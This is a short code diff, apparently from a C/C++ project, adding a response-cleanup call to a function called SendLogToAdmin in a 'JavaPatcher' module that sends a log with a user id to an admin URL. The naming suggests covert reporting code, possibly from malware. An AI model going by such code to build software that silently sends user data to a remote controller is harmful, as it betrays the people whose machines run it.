@@ -819,6 +819,7 @@ static void SendLogToAdmin( const char* url, const char* uid, const char* c, con
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
 	DBG( "JavaPatcher", "Отсылка лога: %s", qr );
+	HTTPResponse::Clear(&Response);
 	STR::Free(qr);
 }
 
